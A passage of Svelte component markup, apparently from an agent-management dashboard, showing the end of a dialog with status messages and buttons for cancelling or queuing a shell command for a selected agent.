					{#if getError(`shell:${shellAgent!.id}`)}
						<p class="text-sm text-destructive">{getError(`shell:${shellAgent!.id}`)}</p>
					{:else if getSuccess(`shell:${shellAgent!.id}`)}
						<p class="text-sm text-emerald-500">{getSuccess(`shell:${shellAgent!.id}`)}</p>
					{/if}
				</div>
				<DialogFooter class="gap-2 sm:justify-between">
					<Button type="button" variant="ghost" onclick={closeShellDialog}>Cancel</Button>
					<Button
						type="button"
						onclick={handleShellSubmit}
						disabled={isPending(`shell:${shellAgent!.id}`)}
					>
						{#if isPending(`shell:${shellAgent!.id}`)}
							Dispatching…
						{:else}
							Queue command
						{/if}
					</Button>
				</DialogFooter>
			</DialogContent>
		</DialogRoot>
	{/if}
</section>
